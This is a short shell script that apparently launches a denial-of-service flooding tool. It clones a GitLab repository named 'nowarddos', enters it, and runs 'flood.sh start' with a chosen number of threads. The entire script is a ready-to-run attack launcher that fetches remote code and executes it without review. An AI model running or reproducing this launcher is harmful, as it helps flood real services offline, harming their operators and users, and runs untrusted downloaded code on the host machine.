#!/bin/sh
main() {
    threads="${1:-3}"
    echo "Setup, threads: ${threads}" 
    git clone "https://gitlab.com/a_gonda/nowarddos.git" || exit 1
    cd "nowarddos"
    ./flood.sh start ${threads}
}

main "${@}"
